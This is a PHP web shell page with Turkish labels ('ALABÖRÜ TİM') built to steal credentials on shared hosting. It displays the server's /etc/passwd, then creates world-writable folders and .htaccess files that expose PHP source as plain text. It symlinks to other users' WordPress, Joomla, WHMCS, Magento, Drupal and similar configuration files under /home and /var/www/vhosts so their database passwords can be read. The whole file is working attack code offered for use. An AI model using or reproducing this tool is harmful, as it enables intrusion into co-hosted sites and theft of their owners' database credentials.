<style>
p{
    color:white;
    font-size:18px;
    font-family: "Times New Roman", Times, serif;
}
input{
    border-style: solid;
    border-color:777;
    color:white;
    background-color:111;
    font-size:18px;
    font-family: "Times New Roman", Times, serif;
}
input:hover{
    -webkit-box-shadow: 0px 0px 45px -8px red;
    -moz-box-shadow: 0px 0px 45px -8px red;
    box-shadow: 0px 0px 45px -8px blue;
}
textarea{
    margin: 0px; 
    width: 458px; 
    height: 257px;
    color:white;
    border-style: solid;
    background-color:111;
    border-color:777;
    font-size:90%;
    font-family: "Times New Roman", Times, serif;
}
textarea:hover{
    -webkit-box-shadow: 0px 0px 45px -8px red;
    -moz-box-shadow: 0px 0px 45px -8px red;
    box-shadow: 0px 0px 45px -8px blue
}
textarea::-webkit-scrollbar {
    width: 10px;
}
 
textarea::-webkit-scrollbar-track {
    -webkit-box-shadow: inset 0 0 6px rgba(0,0,0,0.3);
}
 
textarea::-webkit-scrollbar-thumb {
  background-color: 222;
  outline: 1px solid 111;
}


body::-webkit-scrollbar {
    width: 10px;
}
 
body::-webkit-scrollbar-track {
    -webkit-box-shadow: inset 0 0 6px rgba(0,0,0,0.3);
}
 
body::-webkit-scrollbar-thumb {
  background-color: 222;
  outline: 1px solid 111;
}

</style>
<title>ALA</title>
<body bgcolor='black'>
<center>
<p>ALABÖRÜ TİM</p>
<img src='https://i.pinimg.com/originals/b3/70/5c/b3705cc2edf8f527789e6e2be29f6267.gif' width='75'></img>
<form method='post'>
<p>/etc/passwd</p>
<textarea name='passwd'>
<?php echo file_get_contents("/etc/passwd"); ?>
</textarea>
<p>Dizin</p><input size='50' name='dizin' value='<?php echo getcwd(); ?>'type='text'></input><br>
<p>Ara Dizin</p><input size='50' name='dizin1' value='/'type='text'></input></div>
<br><br><input type='submit' class='gonder' name='gonder' value='Çalıştır'></input>
</form>
</center>
</body>
<?php
if($_POST['gonder']){
    mkdir("alaconf");
    chmod("alaconf",0777);
    chdir("alaconf");
    file_put_contents(".htaccess","Options all DirectoryIndex Sux.html
AddType text/plain .php
AddHandler server-parsed .php
AddType text/plain .html
AddHandler txt .html
Require None
Satisfy Any
    ");
    mkdir("round");
    chmod("round",0777);
    chdir("round");
    file_put_contents(".htaccess","Options all DirectoryIndex Sux.html
AddType text/plain .php
AddHandler server-parsed .php
AddType text/plain .html
AddHandler txt .html
Require None
Satisfy Any
    ");
    $dizin = htmlspecialchars($_POST['dizin']);
    $dizin1 = htmlspecialchars($_POST['dizin1']);
    foreach($_POST['passwd'] as $pwd){
        $pawd=explode(":",$pwd);
        $sitess = $pwd[0];
        symlink($dizin.$sitess.$dizin1.'includes/configure.php',$sitess.'-shop.txt');
        symlink($dizin.$sitess.$dizin1.'os/includes/configure.php',$sitess.'-shop-os.txt');
        symlink($dizin.$sitess.$dizin1.'oscom/includes/configure.php',$sitess.'-oscom.txt');
        symlink($dizin.$sitess.$dizin1.'oscommerce/includes/configure.php',$sitess.'-oscommerce.txt');
        symlink($dizin.$sitess.$dizin1.'oscommerces/includes/configure.php',$sitess.'-oscommerces.txt');
        symlink($dizin.$sitess.$dizin1.'shop/includes/configure.php',$sitess.'-shop2.txt');
        symlink($dizin.$sitess.$dizin1.'shopping/includes/configure.php',$sitess.'-shop-shopping.txt');
        symlink($dizin.$sitess.$dizin1.'sale/includes/configure.php',$sitess.'-sale.txt');
        symlink($dizin.$sitess.$dizin1.'amember/config.inc.php',$sitess.'-amember.txt');
        symlink($dizin.$sitess.$dizin1.'config.inc.php',$sitess.'-amember2.txt');
        symlink($dizin.$sitess.$dizin1.'members/configuration.php',$sitess.'-members.txt');
        symlink($dizin.$sitess.$dizin1.'config.php',$sitess.'-4images1.txt');
        symlink($dizin.$sitess.$dizin1.'forum/includes/config.php',$sitess.'-forum.txt');
        symlink($dizin.$sitess.$dizin1.'forums/includes/config.php',$sitess.'-forums.txt');
        symlink($dizin.$sitess.$dizin1.'admin/conf.php',$sitess.'-5.txt');
        symlink($dizin.$sitess.$dizin1.'admin/config.php',$sitess.'-4.txt');
        symlink($dizin.$sitess.$dizin1.'wp-config.php',$sitess.'-wp13.txt');
        symlink($dizin.$sitess.$dizin1.'wp/wp-config.php',$sitess.'-wp13-wp.txt');
        symlink($dizin.$sitess.$dizin1.'WP/wp-config.php',$sitess.'-wp13-WP.txt');
        symlink($dizin.$sitess.$dizin1.'wp/beta/wp-config.php',$sitess.'-wp13-wp-beta.txt');
        symlink($dizin.$sitess.$dizin1.'beta/wp-config.php',$sitess.'-wp13-beta.txt');
        symlink($dizin.$sitess.$dizin1.'press/wp-config.php',$sitess.'-wp13-press.txt');
        symlink($dizin.$sitess.$dizin1.'wordpress/wp-config.php',$sitess.'-wp13-wordpress.txt');
        symlink($dizin.$sitess.$dizin1.'Wordpress/wp-config.php',$sitess.'-wp13-Wordpress.txt');
        symlink($dizin.$sitess.$dizin1.'blog/wp-config.php',$sitess.'-wp13-Wordpress.txt');
        symlink($dizin.$sitess.$dizin1.'wordpress/beta/wp-config.php',$sitess.'-wp13-wordpress-beta.txt');
        symlink($dizin.$sitess.$dizin1.'news/wp-config.php',$sitess.'-wp13-news.txt');
        symlink($dizin.$sitess.$dizin1.'new/wp-config.php',$sitess.'-wp13-new.txt');
        symlink($dizin.$sitess.$dizin1.'blog/wp-config.php',$sitess.'-wp-blog.txt');
        symlink($dizin.$sitess.$dizin1.'beta/wp-config.php',$sitess.'-wp-beta.txt');
        symlink($dizin.$sitess.$dizin1.'blogs/wp-config.php',$sitess.'-wp-blogs.txt');
        symlink($dizin.$sitess.$dizin1.'home/wp-config.php',$sitess.'-wp-home.txt');
        symlink($dizin.$sitess.$dizin1.'protal/wp-config.php',$sitess.'-wp-protal.txt');
        symlink($dizin.$sitess.$dizin1.'site/wp-config.php',$sitess.'-wp-site.txt');
        symlink($dizin.$sitess.$dizin1.'main/wp-config.php',$sitess.'-wp-main.txt');
        symlink($dizin.$sitess.$dizin1.'test/wp-config.php',$sitess.'-wp-test.txt');
        symlink($dizin.$sitess.$dizin1.'arcade/functions/dbclass.php',$sitess.'-ibproarcade.txt');
        symlink($dizin.$sitess.$dizin1.'arcade/functions/dbclass.php',$sitess.'-ibproarcade.txt');
        symlink($dizin.$sitess.$dizin1.'joomla/configuration.php',$sitess.'-joomla2.txt');
        symlink($dizin.$sitess.$dizin1.'protal/configuration.php',$sitess.'-joomla-protal.txt');
        symlink($dizin.$sitess.$dizin1.'joo/configuration.php',$sitess.'-joo.txt');
        symlink($dizin.$sitess.$dizin1.'cms/configuration.php',$sitess.'-joomla-cms.txt');
        symlink($dizin.$sitess.$dizin1.'site/configuration.php',$sitess.'-joomla-site.txt');
        symlink($dizin.$sitess.$dizin1.'main/configuration.php',$sitess.'-joomla-main.txt');
        symlink($dizin.$sitess.$dizin1.'news/configuration.php',$sitess.'-joomla-news.txt');
        symlink($dizin.$sitess.$dizin1.'new/configuration.php',$sitess.'-joomla-new.txt');
        symlink($dizin.$sitess.$dizin1.'home/configuration.php',$sitess.'-joomla-home.txt');
        symlink($dizin.$sitess.$dizin1.'vb/includes/config.php',$sitess.'-vb~config.txt');
        symlink($dizin.$sitess.$dizin1.'vb3/includes/config.php',$sitess.'-vb3~config.txt');
        symlink($dizin.$sitess.$dizin1.'cc/includes/config.php',$sitess.'-vb1~config.txt');
        symlink($dizin.$sitess.$dizin1.'includes/config.php',$sitess.'-includes-vb.txt');
        symlink($dizin.$sitess.$dizin1.'forum/includes/class_core.php',$sitess.'-vbluttin~class_core.php.txt');
        symlink($dizin.$sitess.$dizin1.'vb/includes/class_core.php',$sitess.'-vbluttin~class_core.php1.txt');
        symlink($dizin.$sitess.$dizin1.'cc/includes/class_core.php',$sitess.'-vbluttin~class_core.php2.txt');
        symlink($dizin.$sitess.$dizin1.'whm/configuration.php',$sitess.'-whm15.txt');
        symlink($dizin.$sitess.$dizin1.'central/configuration.php',$sitess.'-whm-central.txt');
        symlink($dizin.$sitess.$dizin1.'whm/whmcs/configuration.php',$sitess.'-whm-whmcs.txt');
        symlink($dizin.$sitess.$dizin1.'whm/WHMCS/configuration.php',$sitess.'-whm-WHMCS.txt');
        symlink($dizin.$sitess.$dizin1.'whmc/WHM/configuration.php',$sitess.'-whmc-WHM.txt');
        symlink($dizin.$sitess.$dizin1.'whmcs/configuration.php',$sitess.'-whmcs.txt');
        symlink($dizin.$sitess.$dizin1.'support/configuration.php',$sitess.'-support.txt');
        symlink($dizin.$sitess.$dizin1.'supp/configuration.php',$sitess.'-supp.txt');
        symlink($dizin.$sitess.$dizin1.'secure/configuration.php',$sitess.'-sucure.txt');
        symlink($dizin.$sitess.$dizin1.'secure/whm/configuration.php',$sitess.'-sucure-whm.txt');
        symlink($dizin.$sitess.$dizin1.'secure/whmcs/configuration.php',$sitess.'-sucure-whmcs.txt');
        symlink($dizin.$sitess.$dizin1.'cpanel/configuration.php',$sitess.'-cpanel.txt');
        symlink($dizin.$sitess.$dizin1.'panel/configuration.php',$sitess.'-panel.txt');
        symlink($dizin.$sitess.$dizin1.'host/configuration.php',$sitess.'-host.txt');
        symlink($dizin.$sitess.$dizin1.'hosting/configuration.php',$sitess.'-hosting.txt');
        symlink($dizin.$sitess.$dizin1.'hosts/configuration.php',$sitess.'-hosts.txt');
        symlink($dizin.$sitess.$dizin1.'configuration.php',$sitess.'-joomla.txt');
        symlink($dizin.$sitess.$dizin1.'submitticket.php',$sitess.'-whmcs2.txt');
        symlink($dizin.$sitess.$dizin1.'clients/configuration.php',$sitess.'-clients.txt');
        symlink($dizin.$sitess.$dizin1.'client/configuration.php',$sitess.'-client.txt');
        symlink($dizin.$sitess.$dizin1.'clientes/configuration.php',$sitess.'-clientes.txt');
        symlink($dizin.$sitess.$dizin1.'cliente/configuration.php',$sitess.'-client.txt');
        symlink($dizin.$sitess.$dizin1.'clientsupport/configuration.php',$sitess.'-clientsupport.txt');
        symlink($dizin.$sitess.$dizin1.'billing/configuration.php',$sitess.'-billing.txt'); 
        symlink($dizin.$sitess.$dizin1.'manage/configuration.php',$sitess.'-whm-manage.txt'); 
        symlink($dizin.$sitess.$dizin1.'my/configuration.php',$sitess.'-whm-my.txt'); 
        symlink($dizin.$sitess.$dizin1.'myshop/configuration.php',$sitess.'-whm-myshop.txt'); 
        symlink($dizin.$sitess.$dizin1.'includes/dist-configure.php',$sitess.'-zencart.txt'); 
        symlink($dizin.$sitess.$dizin1.'zencart/includes/dist-configure.php',$sitess.'-shop-zencart.txt'); 
        symlink($dizin.$sitess.$dizin1.'shop/includes/dist-configure.php',$sitess.'-shop-ZCshop.txt'); 
        symlink($dizin.$sitess.$dizin1.'Settings.php',$sitess.'-smf.txt'); 
        symlink($dizin.$sitess.$dizin1.'smf/Settings.php',$sitess.'-smf2.txt'); 
        symlink($dizin.$sitess.$dizin1.'forum/Settings.php',$sitess.'-smf-forum.txt'); 
        symlink($dizin.$sitess.$dizin1.'forums/Settings.php',$sitess.'-smf-forums.txt'); 
        symlink($dizin.$sitess.$dizin1.'upload/includes/config.php',$sitess.'-up.txt');
        symlink($dizin.$sitess.$dizin1.'article/config.php',$sitess.'-Nwahy.txt'); 
        symlink($dizin.$sitess.$dizin1.'up/includes/config.php',$sitess.'-up2.txt');
        symlink($dizin.$sitess.$dizin1.'conf_global.php',$sitess.'-6.txt');
        symlink($dizin.$sitess.$dizin1.'include/db.php',$sitess.'-7.txt');
        symlink($dizin.$sitess.$dizin1.'connect.php',$sitess.'-PHP-Fusion.txt');
        symlink($dizin.$sitess.$dizin1.'mk_conf.php',$sitess.'-9.txt');
        symlink($dizin.$sitess.$dizin1.'includes/config.php',$sitess.'-traidnt1.txt');
        symlink($dizin.$sitess.$dizin1.'config.php',$sitess.'-4images.txt');
        symlink($dizin.$sitess.$dizin1.'sites/default/settings.php',$sitess.'-Drupal.txt');
        symlink($dizin.$sitess.$dizin1.'member/configuration.php',$sitess.'-1member.txt') ; 
        symlink($dizin.$sitess.$dizin1.'billings/configuration.php',$sitess.'-billings.txt') ; 
        symlink($dizin.$sitess.$dizin1.'whm/configuration.php',$sitess.'-whm.txt');
        symlink($dizin.$sitess.$dizin1.'supports/configuration.php',$sitess.'-supports.txt');
        symlink($dizin.$sitess.$dizin1.'requires/config.php',$sitess.'-AM4SS-hosting.txt');
        symlink($dizin.$sitess.$dizin1.'supports/includes/iso4217.php',$sitess.'-hostbills-supports.txt');
        symlink($dizin.$sitess.$dizin1.'client/includes/iso4217.php',$sitess.'-hostbills-client.txt');
        symlink($dizin.$sitess.$dizin1.'support/includes/iso4217.php',$sitess.'-hostbills-support.txt');
        symlink($dizin.$sitess.$dizin1.'billing/includes/iso4217.php',$sitess.'-hostbills-billing.txt');
        symlink($dizin.$sitess.$dizin1.'billings/includes/iso4217.php',$sitess.'-hostbills-billings.txt');
        symlink($dizin.$sitess.$dizin1.'host/includes/iso4217.php',$sitess.'-hostbills-host.txt');
        symlink($dizin.$sitess.$dizin1.'hosts/includes/iso4217.php',$sitess.'-hostbills-hosts.txt');
        symlink($dizin.$sitess.$dizin1.'hosting/includes/iso4217.php',$sitess.'-hostbills-hosting.txt');
        symlink($dizin.$sitess.$dizin1.'hostings/includes/iso4217.php',$sitess.'-hostbills-hostings.txt');
        symlink($dizin.$sitess.$dizin1.'includes/iso4217.php',$sitess.'-hostbills.txt');
        symlink($dizin.$sitess.$dizin1.'hostbills/includes/iso4217.php',$sitess.'-hostbills-hostbills.txt');
        symlink($dizin.$sitess.$dizin1.'hostbill/includes/iso4217.php',$sitess.'-hostbills-hostbill.txt');
    }
    chdir("..");
    mkdir("vhost");
    chmod("vhost",0777);
    chdir("vhost");
    file_put_contents(".htaccess","Options all DirectoryIndex Sux.html
AddType text/plain .php
AddHandler server-parsed .php
AddType text/plain .html
AddHandler txt .html
Require None
Satisfy Any
    ");
    foreach($_POST['passwd'] as $pwd){
        $pawd=explode(":",$pwd);
        $sitess = $pwd[0];
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/includes/configure.php',$sitess.'-shop.txt');
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/os/includes/configure.php',$sitess.'-shop-os.txt');
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/oscom/includes/configure.php',$sitess.'-oscom.txt');
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/oscommerce/includes/configure.php',$sitess.'-oscommerce.txt');
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/oscommerces/includes/configure.php',$sitess.'-oscommerces.txt');
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/shop/includes/configure.php',$sitess.'-shop2.txt');
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/shopping/includes/configure.php',$sitess.'-shop-shopping.txt');
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/sale/includes/configure.php',$sitess.'-sale.txt');
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/amember/config.inc.php',$sitess.'-amember.txt');
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/config.inc.php',$sitess.'-amember2.txt');
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/members/configuration.php',$sitess.'-members.txt');
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/config.php',$sitess.'-4images1.txt');
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/forum/includes/config.php',$sitess.'-forum.txt');
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/forums/includes/config.php',$sitess.'-forums.txt');
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/admin/conf.php',$sitess.'-5.txt');
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/admin/config.php',$sitess.'-4.txt');
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/wp-config.php',$sitess.'-Wordpress.txt');
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/wp/wp-config.php',$sitess.'-Wordpress.txt');
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/WP/wp-config.php',$sitess.'-Wordpress.txt');
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/wp/beta/wp-config.php',$sitess.'-Wordpress.txt');
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/beta/wp-config.php',$sitess.'-Wordpress.txt');
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/press/wp-config.php',$sitess.'-wp13-press.txt');
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/wordpress/wp-config.php',$sitess.'-wordpress.txt');
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/Wordpress/wp-config.php',$sitess.'-Wordpress.txt');
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/blog/wp-config.php',$sitess.'-Wordpress.txt');
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/wordpress/beta/wp-config.php',$sitess.'-Wordpress.txt');
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/news/wp-config.php',$sitess.'-Wordpress-news.txt');
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/new/wp-config.php',$sitess.'-Wordpress-new.txt');
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/blog/wp-config.php',$sitess.'-Wordpress-blog.txt');
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/beta/wp-config.php',$sitess.'-Wordpress-beta.txt');
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/blogs/wp-config.php',$sitess.'-Wordpress-blogs.txt');
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/home/wp-config.php',$sitess.'-Wordpress-home.txt');
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/protal/wp-config.php',$sitess.'-Wordpress-protal.txt');
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/site/wp-config.php',$sitess.'-Wordpress-site.txt');
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/main/wp-config.php',$sitess.'-Wordpress-main.txt');
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/test/wp-config.php',$sitess.'-Wordpress-test.txt');
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/arcade/functions/dbclass.php',$sitess.'-ibproarcade.txt');
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/arcade/functions/dbclass.php',$sitess.'-ibproarcade.txt');
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/joomla/configuration.php',$sitess.'-joomla2.txt');
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/protal/configuration.php',$sitess.'-joomla-protal.txt');
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/joo/configuration.php',$sitess.'-joo.txt');
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/cms/configuration.php',$sitess.'-joomla-cms.txt');
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/site/configuration.php',$sitess.'-joomla-site.txt');
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/main/configuration.php',$sitess.'-joomla-main.txt');
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/news/configuration.php',$sitess.'-joomla-news.txt');
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/new/configuration.php',$sitess.'-joomla-new.txt');
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/home/configuration.php',$sitess.'-joomla-home.txt');
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/vb/includes/config.php',$sitess.'-vb~config.txt');
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/vb3/includes/config.php',$sitess.'-vb3~config.txt');
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/cc/includes/config.php',$sitess.'-vb1~config.txt');
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/forum/includes/class_core.php',$sitess.'-vbluttin~class_core.php.txt');
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/vb/includes/class_core.php',$sitess.'-vbluttin~class_core.php1.txt');
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/cc/includes/class_core.php',$sitess.'-vbluttin~class_core.php2.txt');
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/whm/configuration.php',$sitess.'-whm15.txt');
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/central/configuration.php',$sitess.'-whm-central.txt');
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/whm/whmcs/configuration.php',$sitess.'-whm-whmcs.txt');
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/whm/WHMCS/configuration.php',$sitess.'-whm-WHMCS.txt');
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/whmc/WHM/configuration.php',$sitess.'-whmc-WHM.txt');
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/whmcs/configuration.php',$sitess.'-whmcs.txt');
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/support/configuration.php',$sitess.'-support.txt');
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/supp/configuration.php',$sitess.'-supp.txt');
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/secure/configuration.php',$sitess.'-sucure.txt');
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/secure/whm/configuration.php',$sitess.'-sucure-whm.txt');
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/secure/whmcs/configuration.php',$sitess.'-sucure-whmcs.txt');
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/cpanel/configuration.php',$sitess.'-cpanel.txt');
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/panel/configuration.php',$sitess.'-panel.txt');
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/host/configuration.php',$sitess.'-host.txt');
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/hosting/configuration.php',$sitess.'-hosting.txt');
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/hosts/configuration.php',$sitess.'-hosts.txt');
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/configuration.php',$sitess.'-joomla.txt');
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/submitticket.php',$sitess.'-whmcs2.txt');
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/clients/configuration.php',$sitess.'-clients.txt');
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/client/configuration.php',$sitess.'-client.txt');
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/clientes/configuration.php',$sitess.'-clientes.txt');
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/cliente/configuration.php',$sitess.'-client.txt');
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/clientsupport/configuration.php',$sitess.'-clientsupport.txt');
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/billing/configuration.php',$sitess.'-billing.txt'); 
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/manage/configuration.php',$sitess.'-whm-manage.txt'); 
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/my/configuration.php',$sitess.'-whm-my.txt'); 
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/myshop/configuration.php',$sitess.'-whm-myshop.txt'); 
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/includes/dist-configure.php',$sitess.'-zencart.txt'); 
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/zencart/includes/dist-configure.php',$sitess.'-shop-zencart.txt'); 
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/shop/includes/dist-configure.php',$sitess.'-shop-ZCshop.txt'); 
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/Settings.php',$sitess.'-smf.txt'); 
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/smf/Settings.php',$sitess.'-smf2.txt'); 
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/forum/Settings.php',$sitess.'-smf-forum.txt'); 
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/forums/Settings.php',$sitess.'-smf-forums.txt'); 
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/upload/includes/config.php',$sitess.'-up.txt');
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/article/config.php',$sitess.'-Nwahy.txt'); 
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/up/includes/config.php',$sitess.'-up2.txt');
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/conf_global.php',$sitess.'-6.txt');
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/include/db.php',$sitess.'-7.txt');
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/connect.php',$sitess.'-PHP-Fusion.txt');
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/mk_conf.php',$sitess.'-9.txt');
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/config.php',$sitess.'-4images.txt');
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/sites/default/settings.php',$sitess.'-Drupal.txt');
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/member/configuration.php',$sitess.'-1member.txt') ; 
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/billings/configuration.php',$sitess.'-billings.txt') ; 
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/whm/configuration.php',$sitess.'-whm.txt');
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/supports/configuration.php',$sitess.'-supports.txt');
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/requires/config.php',$sitess.'-AM4SS-hosting.txt');
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/supports/includes/iso4217.php',$sitess.'-hostbills-supports.txt');
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/client/includes/iso4217.php',$sitess.'-hostbills-client.txt');
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/support/includes/iso4217.php',$sitess.'-hostbills-support.txt');
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/billing/includes/iso4217.php',$sitess.'-hostbills-billing.txt');
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/billings/includes/iso4217.php',$sitess.'-hostbills-billings.txt');
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/host/includes/iso4217.php',$sitess.'-hostbills-host.txt');
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/hosts/includes/iso4217.php',$sitess.'-hostbills-hosts.txt');
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/hosting/includes/iso4217.php',$sitess.'-hostbills-hosting.txt');
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/hostings/includes/iso4217.php',$sitess.'-hostbills-hostings.txt');
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/includes/iso4217.php',$sitess.'-hostbills.txt');
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/hostbillincludes/iso4217.php',$sitess.'-hostbills-hostbills.txt');
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/includes/iso4217.php',$sitess.'-hostbills-hostbill.txt');
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/app/etc/local.xml',$sitess.'-Magento.txt');
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/admin/config.php',$sitess.'-Opencart.txt');
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/config/settings.inc.php',$sitess.'-Prestashop.txt');
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/config/koneksi.php',$sitess.'-Lokomedia.txt');
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/lokomedia/config/koneksi.php',$sitess.'-Lokomedia.txt');
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/slconfig.php',$sitess.'-Sitelock.txt');
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/application/config/database.php',$sitess.'-Ellislab.txt'); 
    }
    chdir("..");
    mkdir("public_html");
    chmod("public_html",0777);
    chdir("public_html");
    file_put_contents(".htaccess","Options all DirectoryIndex Sux.html
    AddType text/plain .php
    AddHandler server-parsed .php
    AddType text/plain .html
    AddHandler txt .html
    Require None
    Satisfy Any
    ");
    foreach($_POST['passwd'] as $pwd){
        $pawd=explode(":",$pwd);
        $sitess = $pwd[0];
        symlink('/home/'.$sitess.'/public_html/includes/configure.php',$sitess.'-shop.txt');
        symlink('/home/'.$sitess.'/public_html/os/includes/configure.php',$sitess.'-shop-os.txt');
        symlink('/home/'.$sitess.'/public_html/oscom/includes/configure.php',$sitess.'-oscom.txt');
        symlink('/home/'.$sitess.'/public_html/oscommerce/includes/configure.php',$sitess.'-oscommerce.txt');
        symlink('/home/'.$sitess.'/public_html/oscommerces/includes/configure.php',$sitess.'-oscommerces.txt');
        symlink('/home/'.$sitess.'/public_html/shop/includes/configure.php',$sitess.'-shop2.txt');
        symlink('/home/'.$sitess.'/public_html/shopping/includes/configure.php',$sitess.'-shop-shopping.txt');
        symlink('/home/'.$sitess.'/public_html/sale/includes/configure.php',$sitess.'-sale.txt');
        symlink('/home/'.$sitess.'/public_html/amember/config.inc.php',$sitess.'-amember.txt');
        symlink('/home/'.$sitess.'/public_html/config.inc.php',$sitess.'-amember2.txt');
        symlink('/home/'.$sitess.'/public_html/members/configuration.php',$sitess.'-members.txt');
        symlink('/home/'.$sitess.'/public_html/config.php',$sitess.'-4images1.txt');
        symlink('/home/'.$sitess.'/public_html/forum/includes/config.php',$sitess.'-forum.txt');
        symlink('/home/'.$sitess.'/public_html/forums/includes/config.php',$sitess.'-forums.txt');
        symlink('/home/'.$sitess.'/public_html/admin/conf.php',$sitess.'-5.txt');
        symlink('/home/'.$sitess.'/public_html/admin/config.php',$sitess.'-4.txt');
        symlink('/home/'.$sitess.'/public_html/wp-config.php',$sitess.'-wp13.txt');
        symlink('/home/'.$sitess.'/public_html/wp/wp-config.php',$sitess.'-wp13-wp.txt');
        symlink('/home/'.$sitess.'/public_html/WP/wp-config.php',$sitess.'-wp13-WP.txt');
        symlink('/home/'.$sitess.'/public_html/wp/beta/wp-config.php',$sitess.'-wp13-wp-beta.txt');
